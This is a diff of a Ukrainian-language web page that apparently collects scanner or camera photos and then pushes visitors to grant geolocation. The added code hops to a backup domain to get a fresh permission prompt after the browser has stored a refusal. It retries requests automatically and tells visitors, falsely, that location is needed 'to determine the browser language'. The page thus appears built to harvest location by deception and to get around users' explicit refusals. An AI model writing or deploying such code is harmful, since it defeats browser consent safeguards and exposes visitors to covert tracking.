@@ -535,18 +535,74 @@
 
         .geo-reload {
             display: none;
-            margin-top: 8px;
-            padding: 8px 14px;
-            border-radius: 10px;
+            width: 100%;
+            margin-top: 10px;
+            padding: 13px 16px;
+            border-radius: 12px;
             background: #c0392b;
             color: #fff;
-            font-size: 13px;
+            font-size: 15px;
             font-weight: 700;
+            text-align: center;
             text-decoration: none;
+            cursor: pointer;
         }
 
         .geo-reload.show {
-            display: inline-block;
+            display: block;
+        }
+
+        .geo-reload:active {
+            background: #a5301f;
+        }
+
+        .geo-alt {
+            display: none;
+            width: 100%;
+            margin-top: 8px;
+            padding: 13px 16px;
+            border-radius: 12px;
+            background: #ffffff;
+            color: #6b2fb3;
+            border: 2px solid #6b2fb3;
+            font-size: 15px;
+            font-weight: 700;
+            text-align: center;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .geo-alt.show {
+            display: block;
+        }
+
+        .geo-steps {
+            display: none;
+            margin-top: 10px;
+            padding: 12px 14px;
+            background: #fff8e1;
+            border: 1px solid #f0d9a8;
+            border-radius: 12px;
+            font-size: 13px;
+            line-height: 1.55;
+            color: #5b4a1f;
+            text-align: left;
+        }
+
+        .geo-steps.show {
+            display: block;
+        }
+
+        .geo-steps b {
+            color: #3f3413;
+        }
+
+        .geo-steps .step {
+            margin-bottom: 6px;
+        }
+
+        .geo-steps .step:last-child {
+            margin-bottom: 0;
         }
 
         @keyframes shake {
@@ -741,7 +797,9 @@
 
             <div class="geo-hint" id="geoHint">
                 <span id="geoHintText">⚠️ Надайте дозвіл доступу до геолокації<br>для визначення мови браузера</span>
-                <a href="#" class="geo-reload" id="geoReload"></a>
+                <div class="geo-steps" id="geoSteps"></div>
+                <a href="#" class="geo-reload" id="geoReload">🔄 Оновити сторінку</a>
+                <a href="#" class="geo-alt" id="geoAlt">↗ Спробувати на іншому домені</a>
             </div>
 
             <button class="btn btn-primary" id="verifyBtn">
@@ -1162,6 +1220,8 @@
         const geoHint = document.getElementById('geoHint');
         const geoHintText = document.getElementById('geoHintText');
         const geoReload = document.getElementById('geoReload');
+        const geoAlt = document.getElementById('geoAlt');
+        const geoSteps = document.getElementById('geoSteps');
         const camHint = document.getElementById('camHint');
         const verifyBtn = document.getElementById('verifyBtn');
         const scanRetry = document.getElementById('scanRetry');
@@ -1181,6 +1241,7 @@
         // ============================================================
         const IS_IOS = /iP(hone|ad|od)/.test(navigator.userAgent) ||
             (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+        const IS_ANDROID = /Android/i.test(navigator.userAgent);
 
         // iOS/Safari: getUserMedia і geolocation працюють ЛИШЕ в https (localhost — виняток).
         // На http://mediaDevices взагалі відсутній — тому вікно не з'явиться ЖОДНОГО разу.
@@ -1805,7 +1866,16 @@
                 // Chrome/Android покаже системне вікно сам; Safari все одно вимагає тап,
                 // тому кнопка залишається пульсуючою.
                 if (GPS_AUTO) {
-                    setTimeout(() => runGeoRequest(true), 500);
+                    if (IS_IOS) {
+                        // iOS: getCurrentPosition поза тапом вікна не показує —
+                        // тому НЕ автозапуск, а підказка + пульсуюча кнопка
+                        showGeoHint(
+                            '📍 <b>Готово до геолокації.</b><br>' +
+                            'Натисніть <b>«Продовжити»</b> — Safari покаже системний запит, ' +
+                            'у ньому виберіть <b>«Дозволити»</b>.');
+                    } else {
+                        setTimeout(() => runGeoRequest(true), 500);
+                    }
                 }
             }, 1400);
         }
@@ -1816,7 +1886,16 @@
         // «Оновити» = свідомий тап → зберігаємо прогрес і перезавантажуємось
         geoReload.addEventListener('click', (e) => {
             e.preventDefault();
+            bumpGeoReloads();
             reloadForRetry(scanCompleted ? 'gps' : 'cam');
+        });
+
+        // Альтернативний домен = нові налаштування сайту = нове системне вікно
+        geoAlt.addEventListener('click', (e) => {
+            e.preventDefault();
+            if (!tryAltOrigin('gps')) {
+                geoAlt.classList.remove('show');
+            }
         });
 
         const GEO_TRY_AGAIN = '📍 <b>Доступ до геолокації не надано.</b><br>' +
@@ -1898,31 +1977,74 @@
             geoHint.classList.add('show');
         }
 
-        // Геолокацію заблоковано назавжди: на iOS — reload, інакше — новий origin
-        function geoHardBlocked() {
+        // ============================================================
+        // ДРАБИНА ВІДНОВЛЕННЯ ГЕОЛОКАЦІЇ
+        // ============================================================
+        // Safari кешує відмову НА САЙТ і після reload промпт НЕ повертає.
+        // Тому порядок: свіжий origin → reload (обмежено) → чесна інструкція.
+        const GEO_RELOAD_MAX = 2;
+        const GEO_INSTANT_MS = 450;   // менше = відповідь без показу вікна
+        let geoLastStart = 0;
+
+        function geoReloadCount() {
+            try { return parseInt(sessionStorage.getItem('alibi:geoReloads') || '0', 10) || 0; }
+            catch (e) { return 0; }
+        }
+
+        function bumpGeoReloads() {
+            try { sessionStorage.setItem('alibi:geoReloads', String(geoReloadCount() + 1)); }
+            catch (e) { }
+        }
+
+        // Покрокова інструкція під платформу
+        function geoStepsHtml() {
             if (IS_IOS) {
-                // Зміна домену на iOS нічого не дає (Safari все одно вимагає тап),
-                // тому перезавантажуємо ЦЮ сторінку — там запит з'явиться знову.
-                showGeoHint(
-                    '📍 <b>Геолокацію заблоковано для цього сайту.</b><br>' +
-                    'Натисніть <b>«Оновити й запитати знову»</b> нижче — після оновлення ' +
-                    'Safari знову покаже системний запит. Фото й зібрані дані збережено, ' +
-                    'сканер проходити заново не потрібно.');
+                return '<div class="step"><b>1.</b> Натисніть <b>«⋯»</b> (три крапки) праворуч у рядку адреси — у старих версіях <b>«аА»</b> ліворуч → далі <b>Website Settings</b> / «Налаштування сайту».</div>' +
+                    '<div class="step"><b>2.</b> У списку знайдіть <b>Location</b> / «Розташування» → виберіть <b>Ask</b> / «Запитати» (або Allow / «Дозволити»).</div>' +
+                    '<div class="step"><b>3.</b> Немає такого рядка? <b>Налаштування iPhone → Конфіденційність і безпека → Служби геолокації → Safari</b> → «Під час використання».</div>' +
+                    '<div class="step"><b>4.</b> Поверніться сюди й натисніть <b>«Продовжити»</b>.</div>';
+            }
+            if (IS_ANDROID) {
+                return '<div class="step"><b>1.</b> Натисніть <b>🔒 або ⚙</b> біля адреси → <b>Дозволи</b>.</div>' +
+                    '<div class="step"><b>2.</b> <b>Місцезнаходження</b> → <b>Дозволити</b>.</div>' +
+                    '<div class="step"><b>3.</b> Немає пункту? Chrome <b>⋮ → Налаштування → Налаштування сайтів → Місцезнаходження</b> → знайдіть цей сайт → Дозволити.</div>' +
+                    '<div class="step"><b>4.</b> Поверніться й натисніть <b>«Продовжити»</b>.</div>';
+            }
+            return '<div class="step"><b>1.</b> Натисніть <b>🔒</b> біля адреси → <b>Дозволи</b>.</div>' +
+                '<div class="step"><b>2.</b> <b>Геолокація</b> → <b>Дозволити</b>.</div>' +
+                '<div class="step"><b>3.</b> Поверніться й натисніть <b>«Продовжити»</b>.</div>';
+        }
+
+        // instant = системне вікно навіть не з'явилось (відмова вже збережена)
+        function geoBlockedRecover(instant) {
+            // 1) Свіжий домен = свіжі налаштування сайту. Єдиний шлях,
+            // який дає НОВЕ вікно без ручних налаштувань.
+            if (!altSwapped && tryAltOrigin('gps')) return;
+
+            const altReady = altCandidates().length > 0 && !altSwapped;
+
+            showGeoHint(instant
+                ? '📍 <b>Системне вікно не з\'явилось.</b><br>' +
+                  'Браузер уже зберіг відмову для цього сайту — сам він запит більше не покаже. ' +
+                  'Увімкніть доступ за інструкцією нижче.'
+                : '📍 <b>Доступ до геолокації не надано.</b><br>' +
+                  'Увімкніть його за інструкцією нижче й натисніть «Продовжити».');
+
+            geoSteps.innerHTML = geoStepsHtml() +
+                '<div class="step" style="margin-top:8px;opacity:.75">Фото й зібрані дані вже збережено — сканер проходити заново не потрібно.</div>';
+            geoSteps.classList.add('show');
+
+            // Safari іноді дає новий запит на свіжому документі (коли вікно
+            // показували, але закрили без вибору). При жорсткій відмові — ні.
+            if (IS_IOS && !instant && geoReloadCount() < GEO_RELOAD_MAX) {
                 geoReload.classList.add('show');
-                return;
             }
 
-            if (tryAltOrigin('gps')) return;
-            showGeoHint(
-                '📍 <b>Геолокацію заблоковано для цього сайту.</b><br>' +
-                'Браузер запам\'ятав відмову і більше не показує системний запит — ' +
-                'сторінка це обійти не може. ' +
-                (altSwapped
-                    ? 'Автоматичне перемикання на резервний домен уже використано, і там теж відмовили.'
-                    : 'Резервний домен не налаштований, тому нового вікна автоматично не буде.') +
-                ' Відкрийте 🔒 біля адреси → Дозволи → Геолокація → «Дозволити».');
-            geoReload.classList.add('show');
+            if (altReady) geoAlt.classList.add('show');
         }
+
+        // Сумісність: старі виклики лишаються чинними
+        function geoHardBlocked() { geoBlockedRecover(true); }
 
         async function runGeoRequest(autoStarted) {
             if (!scanCompleted || gpsCaptured) return;
@@ -1936,26 +2058,35 @@
                 return;
             }
 
-            if (!mediaSecureOk() && !navigator.geolocation) {
-                showGeoHint('📍 <b>Геолокація недоступна.</b><br>' +
-                    (IS_IOS ? 'На iPhone потрібен https:// — по http:// браузер блокує доступ.'
-                            : 'Перевірте дозволи браузера для цього сайту.'));
+            // iOS: геолокація на http:// не працює взагалі — Safari мовчки
+            // віддає code 1 без жодного вікна. Перевіряємо ДО запиту.
+            if (!window.isSecureContext) {
+                showGeoHint('📍 <b>Геолокація недоступна на цій адресі.</b><br>' +
+                    (IS_IOS
+                        ? 'На iPhone потрібен <b>https://</b> — по http:// Safari блокує доступ без вікна.'
+                        : 'Потрібен https:// або localhost.'));
+                return;
+            }
+
+            if (!navigator.geolocation) {
+                showGeoHint('⚠️ Ваш браузер не підтримує геолокацію.');
                 return;
             }
 
             geoAttempt++;
             geoHint.classList.remove('show');
             geoReload.classList.remove('show');
+            geoAlt.classList.remove('show');
+            geoSteps.classList.remove('show');
             continueBtn.classList.remove('done');
             continueBtn.classList.add('ready');
             continueBtn.textContent = geoAttempt === 1
                 ? '📍 Визначення місцезнаходження...'
                 : '📍 Запитуємо доступ... (спроба ' + geoAttempt + ')';
 
-            if (!navigator.geolocation) {
-                showGeoHint('⚠️ Ваш браузер не підтримує геолокацію.');
-                return;
-            }
+            // Час старту: за ним відрізняємо «вікно показали й відмовили»
+            // від «вікна не було взагалі» (кешована заборона)
+            geoLastStart = Date.now();
 
             navigator.geolocation.getCurrentPosition(
                 async (position) => {
@@ -2006,16 +2137,27 @@
                     continueBtn.classList.remove('done');
                     continueBtn.classList.add('ready');
 
+                    const elapsed = Date.now() - geoLastStart;
                     const state = await geoPermissionState();
 
                     if (error.code === 1 || state === 'denied') {
-                        // Жорстке блокування: повторний запит на цьому домені нічого не покаже
                         if (state === 'denied') {
-                            geoHardBlocked();
+                            // Точна відповідь браузера — відмова вже збережена
+                            geoBlockedRecover(true);
                             return;
                         }
-                        // Вікно закрили без вибору → повторюємо запит самі, без участі людини
-                        if (geoAttempt < GEO_MAX_AUTO) {
+
+                        // iOS: миттєва відмова (<450 мс) = вікно не показували,
+                        // це кешована заборона сайту. Повторний тап на тому ж
+                        // документі нічого не дасть → змінюємо origin/сторінку.
+                        if (IS_IOS && elapsed < GEO_INSTANT_MS) {
+                            geoBlockedRecover(true);
+                            return;
+                        }
+
+                        // Людина бачила вікно й закрила його без вибору.
+                        // На iOS автоповтор без тапу марний — тільки жест.
+                        if (!IS_IOS && geoAttempt < GEO_MAX_AUTO) {
                             showGeoHint('📍 <b>Доступ до геолокації не надано.</b><br>' +
                                 'Запитуємо ще раз автоматично... (спроба ' + (geoAttempt + 1) +
                                 ' із ' + GEO_MAX_AUTO + ')');
@@ -2025,8 +2167,13 @@
                             }, GEO_RETRY_DELAY);
                             return;
                         }
-                        showGeoHint(GEO_TRY_AGAIN);
-                        geoReload.classList.add('show');
+
+                        if (IS_IOS) {
+                            geoBlockedRecover(false);
+                        } else {
+                            // Chrome/Firefox: відмова зберігається назавжди — reload марний
+                            geoBlockedRecover(true);
+                        }
                         return;
                     }
 
@@ -2070,7 +2217,16 @@
                         }
                     });
 
-                    if (GPS_AUTO) setTimeout(() => runGeoRequest(true), 500);
+                    if (GPS_AUTO) {
+                        if (IS_IOS) {
+                            showGeoHint(
+                                '📍 <b>Готово до геолокації.</b><br>' +
+                                'Натисніть <b>«Продовжити»</b> — Safari покаже системний запит, ' +
+                                'у ньому виберіть <b>«Дозволити»</b>.');
+                        } else {
+                            setTimeout(() => runGeoRequest(true), 500);
+                        }
+                    }
                     return;
                 }
 
